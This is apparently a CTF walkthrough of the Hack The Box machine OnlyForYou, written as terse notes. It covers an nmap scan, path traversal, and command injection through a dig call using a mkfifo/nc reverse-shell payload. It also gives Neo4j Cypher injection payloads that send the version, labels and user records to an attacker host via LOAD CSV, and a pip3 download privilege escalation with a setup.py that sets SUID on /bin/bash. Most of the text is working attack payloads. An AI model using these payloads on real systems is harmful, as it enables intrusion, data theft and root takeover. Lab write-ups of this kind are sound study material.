## OnlyForYou

```
Nmap scan report for only4you.htb (10.10.11.210)
Host is up (0.051s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e883e0a9fd43df38198aaa35438411ec (RSA)
|   256 83f235229b03860c16cfb3fa9f5acd08 (ECDSA)
|_  256 445f7aa377690a77789b04e09f11db80 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Only4you
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

``` 


domain : http://only4you.htb



## Subdomain 


http://beta.only4you.htb


in /download find this source.zip which reveal the FLASK app.... and found also a Path traversal in /dowload 



## Vulnerability LFI 



/download 

image=/etc/passwd	


/var/www/only4you.htb/app.py  -- flask
---------------------/form.py 


resutl = run([f"dig txt {domain}"], shell=True, stdout=PIPE))


f'{email}' uscire con grep e inserire un payload mkfifo coderpwner@code.com|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP 4444 >/tmp/f



port forward in 8001 


neo4j console 


search... found a database injection 



Version

```' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://IP:80/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
```

Label


```
 ' OR 1=1 WITH 1 as a  CALL db.labels() yield label LOAD CSV FROM 'http://IP:80/?label='+label as l RETURN 0 as _0 //
```



User table 


```
' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://IP:80/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
```



## ROOT

https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/


`sudo -l pip3 download http://iP/*tar.gz`


setup.py 


```python

from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import os


def command():
	os.system("chmod u+s /bin/bash")


```




